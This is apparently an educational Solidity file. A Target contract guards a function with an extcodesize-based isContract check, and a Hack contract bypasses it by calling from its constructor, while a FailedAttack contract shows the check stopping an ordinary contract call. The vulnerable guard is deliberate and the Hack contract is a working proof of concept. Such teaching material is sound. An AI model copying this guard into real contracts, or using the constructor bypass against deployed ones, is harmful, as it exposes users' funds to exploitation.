// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "./console.sol";

contract Target {
    function isContract(address account) public view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        console.log("Target.isContract(), size=%d", size);
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        console.log(
            "Target.protected(), isContract? %s",
            isContract(msg.sender)
        );
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
        console.log("Target.protected(), pwned=%s", pwned);
    }
}

contract FailedAttack {
    // Attempting to call Target.protected will fail,
    // Target block calls from contract
    function pwn(address _target) external {
        // This will fail
        console.log("FailedAttack.pwn() calling Target.protected()");
        Target(_target).protected();
    }
}

contract Hack {
    bool public isContract;
    address public addr;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        console.log(
            "Hack.constructor() isContract=%s, addr=%s",
            isContract,
            addr
        );
        // This will work
        Target(_target).protected();
        console.log("Hack.constructor() called Target.protected()");
    }
}
